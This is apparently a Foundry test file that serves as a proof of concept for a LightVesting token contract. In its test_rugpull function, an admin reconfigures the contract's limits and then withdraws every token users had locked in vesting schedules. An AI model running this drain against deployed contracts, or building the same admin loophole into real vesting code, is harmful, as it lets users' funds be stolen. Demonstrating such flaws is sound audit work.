// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import { Test, console } from "forge-std/Test.sol";
import { LightVesting, Config } from "../src/LightVesting.sol";

contract MockERC20 is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) { }

    function mint(uint256 amount) public {
        _mint(msg.sender, amount);
    }
}

contract VestingTest is Test {
    LightVesting vesting;
    IERC20 token;
    Config config;

    address admin = vm.addr(0x1593);
    address user = vm.addr(0x1739);

    function setUp() public {
        MockERC20 mockToken = new MockERC20("Let's steal", "USC");
        token = IERC20(address(mockToken));

        vm.prank(user);
        mockToken.mint(10 ** 10 * 10 ** 18);

        config = Config({
            admin: admin,
            maxAmount: 10 ** 9 * 10 ** 18,
            maxDuration: 5 * 52 weeks,
            maxCliffPercent: 70000,
            fee: 100,
            token: token
        });

        vm.prank(admin);
        vesting = new LightVesting(config);
    }

    function test_rugpull() public {
        vesting.loadConfig(vesting.CONFIG_KEY(), config);

        vm.startPrank(user);

        uint256 amount = 10 ** 8 * 10 ** 18;
        token.approve(address(vesting), amount * 100);

        for (uint256 i = 1; i <= 100; i++) {
            vesting.create(address(vm.addr(i)), 1, amount, block.timestamp, 52 weeks, 10 weeks);
        }

        vm.stopPrank();

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(admin), (amount * 100 * 100) / vesting.DENOM());
        assertEq(token.balanceOf(address(vesting)), (amount * 100 * (vesting.DENOM() - 100)) / vesting.DENOM());

        vm.startPrank(admin);

        config = Config({
            admin: admin,
            maxAmount: (amount * 100 * (vesting.DENOM() - 100)) / vesting.DENOM(),
            maxDuration: 0,
            maxCliffPercent: 0,
            fee: 0,
            token: token
        });

        vesting.configurate(config);
        vesting.withdraw(vesting.CONFIG_KEY());

        vm.stopPrank();

        assertEq(token.balanceOf(admin), amount * 100);
        assertEq(token.balanceOf(address(vesting)), 0);
    }
}
